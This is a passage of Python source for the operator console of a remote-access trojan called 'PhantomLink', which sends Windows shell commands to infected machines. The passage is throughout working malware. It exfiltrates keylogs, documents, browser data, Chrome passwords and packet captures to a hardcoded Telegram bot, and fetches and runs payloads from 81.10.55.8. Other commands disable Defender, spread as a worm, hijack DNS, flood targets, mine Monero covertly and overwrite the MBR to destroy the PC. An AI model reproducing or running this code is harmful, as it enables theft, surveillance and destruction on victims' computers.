                    if response:
                        print(response.decode('utf-8', errors='ignore'))
                        tel_logger(f"Blocked {link} on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                        client['command_in_progress'] = False

                    command5 = 'ipconfig /flushdns'
                    with client['lock']:
                        if not client_manager._send_message(conn, f"CMD:{command5}"):
                            client['command_in_progress'] = False
                            break
                        response = client_manager._recv_message(conn)
                    if response:
                        print(response.decode('utf-8', errors='ignore'))
                        tel_logger(f"{response.decode('utf-8', errors='ignore')}")
                elif rule.strip().lower() == 'unblock':
                    link2 = input("Enter the link without www or .com: ")
                    endlink = input("Enter the end of link without '.' eg(com): ")
                    command3 = f'powershell -Command "(Get-Content $env:windir\\System32\\drivers\\etc\\hosts) | Where-Object {{$_ -notmatch \\"127\\.0\\.0\\.1\\s+www\\.{link2}\\.{endlink}\\"}} | Set-Content $env:windir\\System32\\drivers\\etc\\hosts"'
                    with client['lock']:
                        client['command_in_progress'] = True
                        if not client_manager._send_message(conn, f"CMD:{command3}"):
                            client['command_in_progress'] = False
                            break
                        response = client_manager._recv_message(conn)
                    if response:
                        print(response.decode('utf-8', errors='ignore'))
                        tel_logger(f"Unblocked {link2}.{endlink} on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                        client['command_in_progress'] = False

                    command4 = 'ipconfig /flushdns'
                    with client['lock']:
                        if not client_manager._send_message(conn, f"CMD:{command4}"):
                            client['command_in_progress'] = False
                            break
                        response = client_manager._recv_message(conn)
                    if response:
                        print(response.decode('utf-8', errors='ignore'))
                        tel_logger(f"{response.decode('utf-8', errors='ignore')}")
                else:
                    print("Invalid input")

            elif cmd == 'play':
                path = input("FULL path of audio file: ")
                command2 = f'powershell -Command "Start-Process $env:USERPROFILE\\ffmpeg\\bin\\ffplay.exe -ArgumentList \'-nodisp -autoexit \\"{path}\\"\' -NoNewWindow -Wait"'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Played Audio {path} silently\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'recycle':
                command2 = 'PowerShell.exe -NoProfile -Command Clear-RecycleBin -Force'
                with client['lock']:
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Emptied Recycle Bin on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")

            elif cmd == 'port':
                port = input("Port: ")
                command2 = f'netsh advfirewall firewall add rule name="PhantomLink{port}" dir=in action=allow protocol=TCP localport={port}'
                with client['lock']:
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Port: {port} opened on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")

                command3 = 'ipconfig /flushdns'
                with client['lock']:
                    if not client_manager._send_message(conn, f"CMD:{command3}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"{response.decode('utf-8', errors='ignore')}")

            elif cmd == 'clipboard':
                command2 = 'powershell -command "Get-Clipboard"'
                with client['lock']:
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Clipboard [{username}]: \n{response.decode('utf-8', errors='ignore')}")

            elif cmd == 'kill':
                sure = input("Are you sure? (y/n): ")
                if sure.lower().strip() == 'y':
                    command2 = 'taskkill /f /im svchost.exe'
                    tel_logger(f"Killing PC!")
                    with client['lock']:
                        if not client_manager._send_message(conn, f"CMD:{command2}"):
                            client['command_in_progress'] = False
                            break
                        response = client_manager._recv_message(conn)
                    if response:
                        print(response.decode('utf-8', errors='ignore'))
                        tel_logger(f"[{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                    print("Killing . . .")
                else:
                    continue

            elif cmd == 'wallpaper':
                path = input("FULL path to image: ")
                command2 = fr'reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "{path}" /f && RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Changed Wallpaper for [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'rotate':
                direction = input("up / down / left / right  : ")
                if direction.lower().strip() == 'down':
                    command2 = r'''powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys('^%{DOWN}')"'''
                elif direction.lower().strip() == 'up':
                    command2 = r'''powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys('^%{UP}')"'''
                elif direction.lower().strip() == 'left':
                    command2 = r'''powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys('^%{LEFT}')"'''
                elif direction.lower().strip() == 'right':
                    command2 = r'''powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys('^%{RIGHT}')"'''
                else:
                    print("Invalid input\n")
                    continue

                with client['lock']:
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))

            elif cmd == 'sleep':
                command2 = r'rundll32.exe powrprof.dll,SetSuspendState 0,1,0'
                with client['lock']:
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"PC [{username}] slept\n\n{response.decode('utf-8', errors='ignore')}")

            elif cmd == 'rickroll':
                command2 = 'start https://www.youtube.com/watch?v=dQw4w9WgXcQ'
                with client['lock']:
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"RickRoll video played on {username}\n\n{response.decode('utf-8', errors='ignore')}")

            elif cmd == 'keylog':
                command2 = r'curl -F "document=@%USERPROFILE%\AppData\Roaming\MicrosoftUpdate\keylog.txt" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendDocument?chat_id=6042298920'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    send_log2(f'Keylog file of user [{username}]:')
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"KeyLog file of [{username}] sent\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'keylogger':
                command2 = 'curl -O http://81.10.55.8/keylogger.exe && start /B "" "keylogger.exe"'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"KeyLogger injected on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'screener':
                command3 = r'taskkill /im screener.exe /f & del /f /q "%APPDATA%\MicrosoftUpdate\screener.exe" & curl -O http://81.10.55.8/screenshoter.exe && start /B "" "screenshoter.exe"'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command3}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Auto Screenshoter injected on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'update':
                updating = input('Update PhantomLink? (y/n):  ')
                if updating.lower().strip() == 'y':
                    tel_logger(f"{'='*10}\nUpdating PhantomLink . . .\n{'='*10}")
                    command2 = 'curl -O http://81.10.55.8/PhantomLink.exe && start /B "" "PhantomLink.exe"'
                    with client['lock']:
                        client['command_in_progress'] = True
                        if not client_manager._send_message(conn, f"CMD:{command2}"):
                            client['command_in_progress'] = False
                            break
                        response = client_manager._recv_message(conn)
                    if response:
                        print(response.decode('utf-8', errors='ignore'))
                        tel_logger(f"PhantomLink Updating on {username}\n\n Status:\n{response.decode('utf-8', errors='ignore')}")
                        client['command_in_progress'] = False
                else:
                    continue

            elif cmd == 'harvest':
                extension = input("Extension (pdf/docx/txt): ")
                command2 = f'''powershell -Command "Get-ChildItem -Path C:\\Users -Include *.{extension} -Recurse -ErrorAction SilentlyContinue | Select-Object -First 20 | ForEach-Object {{ curl -F \\"document=@$($_.FullName)\\" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendDocument?chat_id={CHAT_ID} }}"'''
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    send_log2(f'Files of [{username}]:')
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"got files from [{username}] extension ({extension})\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'browser':
                command2 = 'xcopy "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default" "%TEMP%\\chrome_data" /E /I /H /Y'
                command3 = '"C:\\Program Files\\WinRAR\\rar.exe" a -r "%TEMP%\\chrome.rar" "%TEMP%\\chrome_data"'
                command4 = f'curl -F "document=@%TEMP%\\chrome.rar" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendDocument?chat_id={CHAT_ID}'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                with client['lock']:
                    if not client_manager._send_message(conn, f"CMD:{command3}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                with client['lock']:
                    if not client_manager._send_message(conn, f"CMD:{command4}"):
                        client['command_in_progress'] = False
                        break
                    send_log2(f'Browser data for [{username}]:')
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Sent all Browser saved data for [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'netscan':
                command2 = '''powershell -Command "1..254 | ForEach-Object { $ip = \\"192.168.1.$_\\"; if(Test-Connection -ComputerName $ip -Count 1 -Quiet) { \\"$ip - $(Resolve-DnsName $ip -ErrorAction SilentlyContinue).NameHost\\" } }"'''
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"[{username}] netscan:\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'screenrec':
                duration = input("Duration (seconds): ")
                command2 = f'''powershell -Command "Start-Process \\"%USERPROFILE%\\ffmpeg\\bin\\ffmpeg.exe\\" -ArgumentList \\"-f gdigrab -framerate 5 -i desktop -t {duration} -vcodec libx264 -preset ultrafast %USERPROFILE%\\screen.mp4\\" -NoNewWindow -Wait"'''
                command3 = f'curl -F "video=@%USERPROFILE%\\screen.mp4" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendVideo?chat_id={CHAT_ID}'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    client['command_in_progress'] = False
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command3}"):
                        client['command_in_progress'] = False
                        break
                    send_log2(f'Screen rec of [{username}]')
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Screen recorded for {duration}S\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'info':
                command2 = '''powershell -Command "Get-ComputerInfo | Select OSName,OSVersion,WindowsVersion,CSName,CSDomain,BIOSManufacturer | Format-List; Get-WmiObject Win32_Battery | Select EstimatedChargeRemaining"'''
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Got all machine info of [{username}]:\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'killav':
                command2 = 'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
                command3 = 'taskkill /F /IM MsMpEng.exe'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Disabled Windows Defender AV on [{username}]\n\n {response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False
                with client['lock']:
                    if not client_manager._send_message(conn, f"CMD:{command3}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))

            elif cmd == 'creds':
                command2 = 'cmdkey /list > %TEMP%\\creds.txt'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"[{username}] Creds:\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'worm':
                command2 = '''powershell -Command "
                $subnet = '192.168.1';
                1..254 | ForEach-Object {
                    $ip = \\"$subnet.$_\\";
                    if(Test-Connection $ip -Count 1 -Quiet) {
                        try {
                            # Try default credentials
                            $cred = New-Object System.Management.Automation.PSCredential('Administrator', (ConvertTo-SecureString 'admin' -AsPlainText -Force));

                            # Copy payload
                            Copy-Item '%APPDATA%\\MicrosoftUpdate\\defender.exe' \\\\\\\\$ip\\\\C$\\\\Windows\\\\Temp\\\\update.exe;

                            # Execute remotely
                            Invoke-WmiMethod -ComputerName $ip -Credential $cred -Class Win32_Process -Name Create -ArgumentList 'C:\\\\Windows\\\\Temp\\\\update.exe';
                        } catch {}
                    }
                }"'''
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Injecting PhantomLink to all PCs on network of [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'ddos':
                target = input("Target IP/URL: ")
                duration = input("Duration (seconds): ")

                command2 = f'''powershell -Command "
                $end = (Get-Date).AddSeconds({duration});
                while((Get-Date) -lt $end) {{
                    try {{
                        Invoke-WebRequest -Uri '{target}' -Method GET -TimeoutSec 1;
                    }} catch {{}}
                }}"'''

                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Doing DDOS on [{target}] to {duration}S from [{username}]\n\nresponse.decode('utf-8', errors='ignore')")
                    client['command_in_progress'] = False

            elif cmd == 'dnshijack':
                domain = input("Domain to hijack (e.g. facebook.com): ")
                redirect_ip = input("Redirect to IP: ")

                command2 = f'''echo {redirect_ip} {domain} >> %WINDIR%\\System32\\drivers\\etc\\hosts && echo {redirect_ip} www.{domain} >> %WINDIR%\\System32\\drivers\\etc\\hosts && ipconfig /flushdns'''
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"DNS {domain} hijacked to {redirect_ip} on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'mouse':
                action = input("move/click/scroll: ")
                command2 = None

                if action == 'move':
                    x = input("X coordinate: ")
                    y = input("Y coordinate: ")
                    command2 = f'''powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point({x},{y})"'''

                elif action == 'click':
                    command2 = r'''powershell -Command "
                    $sig = '[DllImport(\\"user32.dll\\")]public static extern void mouse_event(int flags,int dx,int dy,int cButtons,int info);';
                    $type = Add-Type -MemberDefinition $sig -Name Mouse -PassThru;
                    $type::mouse_event(0x02,0,0,0,0);
                    $type::mouse_event(0x04,0,0,0,0);
                    "'''

                elif action == 'scroll':
                    direction = input("up/down: ")
                    amount = input("Amount: ")
                    delta = amount if direction == 'up' else f'-{amount}'
                    command2 = f'''powershell -Command "$sig='[DllImport(\\"user32.dll\\")]public static extern void mouse_event(int,int,int,int,int);';$t=Add-Type -MemberDefinition $sig -Name M -PassThru;$t::mouse_event(0x800,0,0,{delta},0)"'''

                if command2:
                    with client['lock']:
                        client['command_in_progress'] = True
                        if not client_manager._send_message(conn, f"CMD:{command2}"):
                            client['command_in_progress'] = False
                            break
                        response = client_manager._recv_message(conn)
                    if response:
                        print(response.decode('utf-8', errors='ignore'))
                        tel_logger(f"Controlled mouse on [{username}]:\n{action}\n\n{response.decode('utf-8', errors='ignore')}")
                        client['command_in_progress'] = False
                else:
                    print('Undefined')

            elif cmd == 'type':
                text = input("Text to type: ")

                # Escape special characters
                text_escaped = text.replace("'", "''").replace('"', '`"')

                command2 = f'''powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('{text_escaped}')"'''
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Injected Keyboard key on [{username}]:\n{text}\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'killmbr':
                confirm = input("THIS WILL BRICK THE PC! Type 'DESTROY' to confirm: ")
                if confirm == 'DESTROY':
                    command2 = r'''powershell -Command "
                    $mbr = New-Object byte[] 512;
                    (New-Object Random).NextBytes($mbr);
                    $disk = [System.IO.File]::Open('\\\\.\\PhysicalDrive0', 'Open', 'Write');
                    $disk.Write($mbr, 0, 512);
                    $disk.Close();
                    "'''
                    tel_logger(f"\n{'='*20}[!] PC [{username}] DESTROYED [!]\n{'='*20}")
                    send_log2(f"\n{'=' * 20}[!] PC [{username}] DESTROYED [!]\n{'=' * 20}")
                    with client['lock']:
                        if not client_manager._send_message(conn, f"CMD:{command2}"):
                            client['command_in_progress'] = False
                            break
                        response = client_manager._recv_message(conn)
                    if response:
                        print(response.decode('utf-8', errors='ignore'))

                else:
                    continue

            elif cmd == 'rootkit':
                action = input("Action (hide/unhide): ").lower()

                if action == 'hide':
                    command2 = '''
            powershell -Command "
            # Hide from Task Manager
            $proc = Get-Process -Id $PID
            $proc.PriorityClass = 'Idle'

            # Inject into explorer.exe
            $code = @'
            [DllImport(\\"kernel32.dll\\")]
            public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

            [DllImport(\\"kernel32.dll\\")]
            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);

            [DllImport(\\"kernel32.dll\\")]
            public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, int flAllocationType, int flProtect);

            [DllImport(\\"kernel32.dll\\")]
            public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
            '@

            Add-Type -MemberDefinition $code -Name 'Rootkit' -Namespace 'Win32'

            # Get explorer.exe
            $explorer = Get-Process -Name explorer | Select -First 1

            # Open process
            $hProcess = [Win32.Rootkit]::OpenProcess(0x1F0FFF, $false, $explorer.Id)

            Write-Output 'Process hidden in explorer.exe'
            "
            '''

                elif action == 'unhide':
                    command2 = 'powershell -Command "Stop-Process -Name python -Force; Write-Output \'Unhidden\'"'

                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)

                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"[ROOTKIT] {action} [{username}]: {response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'mine':
                action = input("Action (start/stop/status): ").lower()

                if action == 'start':
                    wallet = input("Your Monero wallet address: ")
                    threads = input("CPU threads to use (default 2): ") or "2"

                    command2 = f'''
            # Download XMRig miner
            $minerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-msvc-win64.zip"
            $minerZip = "$env:TEMP\\miner.zip"
            $minerDir = "$env:APPDATA\\MicrosoftUpdate\\miner"

            Invoke-WebRequest -Uri $minerUrl -OutFile $minerZip

            # Extract
            Expand-Archive -Path $minerZip -DestinationPath $minerDir -Force
            Remove-Item $minerZip

            # Create config
            $config = @{{
                "autosave" = $true
                "cpu" = @{{
                    "enabled" = $true
                    "max-threads-hint" = {threads}
                }}
                "pools" = @(
                    @{{
                        "url" = "pool.supportxmr.com:443"
                        "user" = "{wallet}"
                        "pass" = "x"
                        "tls" = $true
                    }}
                )
            }} | ConvertTo-Json -Depth 10

            $config | Out-File "$minerDir\\config.json" -Encoding UTF8

            # Start miner hidden
            Start-Process "$minerDir\\xmrig.exe" -ArgumentList "--config=$minerDir\\config.json" -WindowStyle Hidden

            Write-Output "Mining started with {threads} threads"
            '''

                elif action == 'stop':
                    command2 = 'Stop-Process -Name xmrig -Force; Write-Output "Mining stopped"'

                elif action == 'status':
                    command2 = '''
            $miner = Get-Process -Name xmrig -ErrorAction SilentlyContinue
            if ($miner) {
                $cpu = [math]::Round($miner.CPU, 2)
                Write-Output "Mining active - CPU: $cpu%"
            } else {
                Write-Output "Mining not running"
            }
            '''

                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)

                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"[MINER] {action} on [{username}]: {response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'print':
                message = input("Message to print: ")
                copies = input("Number of copies (default 1): ") or "1"

                command2 = f'''
            powershell -Command "
            # Create text file
            $text = @'
            {'=' * 60}
                       PHANTOMLINK
            {'=' * 60}

            {message}

            {'=' * 60}
            '@

            $textPath = '$env:TEMP\\print.txt'
            $text | Out-File -FilePath $textPath -Encoding UTF8

            # Print to all printers
            Get-Printer | ForEach-Object {{
                try {{
                    for ($i = 0; $i -lt {copies}; $i++) {{
                        Start-Process -FilePath $textPath -Verb Print -Wait
                    }}
                    Write-Output \\"Printed to: $($_.Name)\\"
                }} catch {{
                    Write-Output \\"Failed: $($_.Name)\\"
                }}
            }}

            Remove-Item $textPath -Force
            "
            '''

                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)

                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"[PRINTER] Printed {copies} copies: {message} on [{username}]")
                    client['command_in_progress'] = False

            elif cmd == 'spam':
                count = input("Number of popups: ")
                message = input("Message: ")

                command2 = f'''powershell -Command "
                            Add-Type -AssemblyName Microsoft.VisualBasic;
                            for($i=0; $i -lt {count}; $i++) {{
                                [Microsoft.VisualBasic.Interaction]::MsgBox('{message}', 'OKOnly,SystemModal,Critical', 'ERROR');
                                Start-Sleep -Milliseconds 100;
                            }}"'''
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(
                        f"Spammed [{username}]:\n{message} {count} times\n\n {response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'sniff':
                duration = input("Capture for X seconds: ")

                command2 = f'''powershell -Command "
                            $adapter = Get-NetAdapter | Where {{ $_.Status -eq 'Up' }} | Select -First 1;
                            netsh trace start capture=yes tracefile=$env:TEMP\\capture.etl maxsize=100 filemode=single overwrite=yes;
                            Start-Sleep {duration};
                            netsh trace stop;
                            curl -F \\"document=@$env:TEMP\\capture.etl\\" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendDocument?chat_id={CHAT_ID};
                            Remove-Item $env:TEMP\\capture.etl;
                            "'''
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(
                        f"Sniffed network traffic on [{username}] for {duration}S\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'chrome_pass':
                # First, send the Python script to client
                script = '''
            import os,json,base64,sqlite3,shutil
            from Crypto.Cipher import AES
            from win32crypt import CryptUnprotectData

            def get_key():
                path=os.path.join(os.environ["USERPROFILE"],"AppData","Local","Google","Chrome","User Data","Local State")
                with open(path,"r") as f:
                    local_state=json.load(f)
                encrypted_key=base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                return CryptUnprotectData(encrypted_key,None,None,None,0)[1]

            def decrypt_pass(enc_pass,key):
                try:
                    if enc_pass[:3]==b'v10':
                        nonce=enc_pass[3:15]
                        cipher=AES.new(key,AES.MODE_GCM,nonce)
                        return cipher.decrypt(enc_pass[15:])[:-16].decode()
                    return CryptUnprotectData(enc_pass,None,None,None,0)[1].decode()
                except:
                    return "[ERROR]"

            db_path=os.path.join(os.environ["USERPROFILE"],"AppData","Local","Google","Chrome","User Data","Default","Login Data")
            temp_db=os.path.join(os.environ["TEMP"],"ld")
            shutil.copy2(db_path,temp_db)
            conn=sqlite3.connect(temp_db)
            cursor=conn.cursor()
            key=get_key()
            cursor.execute("SELECT origin_url,username_value,password_value FROM logins")
            output=""
            for row in cursor.fetchall():
                pwd=decrypt_pass(row[2],key)
                if row[1] or pwd:
                    output+=f"URL: {row[0]}\\nUser: {row[1]}\\nPass: {pwd}\\n{'='*50}\\n"
            cursor.close()
            conn.close()
            os.remove(temp_db)
            print(output)
            '''

                # Save script to temp file
                command1 = f'echo {base64.b64encode(script.encode()).decode()} > %TEMP%\\cp.b64'
                command2 = 'certutil -decode %TEMP%\\cp.b64 %TEMP%\\chrome_pass.py'

                # Install dependencies
                command3 = 'pip install pycryptodome pywin32 --break-system-packages'

                # Run script
                command4 = 'python %TEMP%\\chrome_pass.py > %TEMP%\\chrome_passwords.txt'

                # Send results
                command5 = f'curl -F "document=@%TEMP%\\chrome_passwords.txt" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendDocument?chat_id={CHAT_ID}'

                # Execute all commands in sequence
                for cmd_exec in [command1, command2, command3, command4, command5]:
                    with client['lock']:
                        client['command_in_progress'] = True
                        if not client_manager._send_message(conn, f"CMD:{cmd_exec}"):
                            client['command_in_progress'] = False
                            break
                        response = client_manager._recv_message(conn)
                    if response:
                        print(response.decode('utf-8', errors='ignore'))
                        client['command_in_progress'] = False

                tel_logger(f"Chrome passwords extracted from [{username}]")


            elif cmd == 'fakeupdate':
                update_type = input("Update type (windows/chrome/office): ").lower()
                duration = input("Duration in minutes (default 10): ") or "10"
                if update_type == 'windows':
